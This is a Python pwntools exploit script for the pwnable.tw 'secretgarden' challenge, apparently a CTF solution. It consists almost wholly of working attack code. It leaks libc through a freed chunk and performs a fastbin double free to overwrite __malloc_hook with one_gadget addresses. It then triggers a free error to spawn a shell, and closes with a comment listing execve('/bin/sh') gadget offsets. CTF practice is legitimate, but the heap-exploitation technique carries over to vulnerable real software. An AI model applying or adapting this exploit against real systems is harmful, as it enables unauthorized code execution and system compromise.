#coding=utf-8
from pwn import *
local = 0
exec_file="./secretgarden"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
argv=["/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so",
            "--library-path","/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/","./secretgarden"]
if local :
    a=process(argv = argv)
    if context.arch == "i386" :
        libc=ELF("/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so",checksec = False) 
else:
    a=remote("chall.pwnable.tw",10203)
    libc=ELF("./libc.so.6")
def get_base(a):
    text_base = a.libs()[a._cwd+"/secretgarden"]
    for key in a.libs():
        if "libc-2.23.so" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b * %d
    '''%(text_base + 0x000107B)
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("Your choice :",str(idx))
def add(size, name, colour):
    menu(1)
    a.sendlineafter("Length of the name :",str(size))
    a.sendafter("The name of flower :",name)
    a.sendlineafter("The color of the flower :",colour)
    return 

def delete(idx):
    menu(3)
    a.sendlineafter("Which flower do you want to remove from the garden:",str(idx))
    return 
    
def edit(idx,content):
    return 
    
def show():
    menu(2)
    return 
relloc_offset = [0,2,4,6,0xb,0xc,0x10]
#payload='\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'\x00'    #stdout-0x33 IO_FILE

add(0xb0,"aaaa","bbbb")
add(0x10,"aaaa","bbbb")
delete(0)


add(0x80,"\xa0","bbbb")
show()
a.recvuntil("Name of the flower[2] :")
libc_base = u64('\x78'+a.recv(6)[1:6]+2*'\x00') - libc.sym["__malloc_hook"] - 0x10 -88
fuck(libc_base) 

add(0x68,"aaaa", "bbbb")#3
add(0x68,"aaaa", "bbbb")#4
delete(3)
delete(4)
delete(3)
add(0x68,p64(libc_base + libc.sym["__malloc_hook"] - 0x23),"bbbb")
add(0x68,"aaaa","bbbb")
add(0x68,"aaaa","bbbb")
add(0x68,'a' * (0x23 - 0x18) + p64(libc_base + 0xf0567) + p64(libc_base + 0xef6c4),"bbbb")
delete(3)
delete(3)
#debug()
a.interactive()
'''
 0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xef6c4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf0567 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''